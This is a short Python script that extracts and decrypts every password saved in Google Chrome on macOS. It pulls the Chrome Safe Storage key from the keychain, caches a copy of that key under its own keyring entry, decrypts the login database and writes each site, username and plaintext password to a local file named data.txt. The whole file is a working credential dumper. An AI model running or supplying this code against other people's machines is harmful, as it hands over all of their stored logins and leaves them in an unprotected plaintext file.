#!/usr/bin/env python

import argparse
import base64
import codecs
import os
import sqlite3
import tempfile
try:
  from urlparse import urlparse
except ImportError:
  from urllib.parse import urlparse
from Crypto.Cipher import AES
import hashlib
import keyring
import collections
import getpass


HOME = os.path.expanduser('~')
CHROME = 'Library/Application Support/Google/Chrome'
PROFILE = 'Default'
LOGIN_DATA = 'Login Data'

CHROME_SERVICE = 'Chrome Safe Storage'
CHROME_USERNAME = 'Chrome'


def get_master_password():
  master = keyring.get_password(__name__, getpass.getuser())
  if master is None:
    master = keyring.get_password(CHROME_SERVICE, CHROME_USERNAME)
    keyring.set_password(__name__, getpass.getuser(), master)
  return master.encode('utf8')


def decrypt(password):
  master_password = get_master_password()
  key = hashlib.pbkdf2_hmac(hash_name='sha1', password=master_password,
                            salt=b'saltysalt', iterations=1003, dklen=16)
  cipher = AES.new(key, AES.MODE_CBC, IV=b' ' * 16)
  binary = cipher.decrypt(base64.b64decode(password))
  return ''.join([chr(i) for i in binary if i >= 32])


def main(query, profile):
  passwords = []
  password2id = []

  with tempfile.NamedTemporaryFile() as tmp:
    with open(os.path.join(HOME, CHROME, profile, LOGIN_DATA), 'rb') as f:
      tmp.write(f.read())
      tmp.flush()
    cursor = sqlite3.connect(tmp.name).cursor()
    cursor.execute('''SELECT origin_url, username_value, password_value
                        FROM logins ORDER BY times_used desc''')
    accounts = []
    for i, (origin_url, account, password) in enumerate(cursor.fetchall()):
        password = base64.b64encode(password[3:]).decode('utf8')
        url = urlparse(origin_url)
        title = codecs.decode(url.netloc.encode('utf8'), 'idna')
        if title.lower().startswith('www.'):
          title = title[4:]
        if url.scheme == 'android':
          title = '%s://%s' % (url.scheme, title.split('@')[1])
        accounts.append((title, account))
        passwords.append(password)
    
  for key, _ in collections.Counter(passwords).most_common():
    password2id.append(key)

  with open('data.txt', 'w') as f:
    for i, (title, account) in enumerate(accounts):
      
      decrypted = decrypt(passwords[i])
      if decrypted is not None and decrypted != '' and account is not None and account != '':
        f.write(title + "|||" + account + "|||" + decrypted + "\n")


if __name__ == '__main__':
  parser = argparse.ArgumentParser()
  parser.add_argument('query', default='', nargs='?')
  parser.add_argument('--profile', default=PROFILE)
  args = parser.parse_args()
  main(args.query, args.profile)
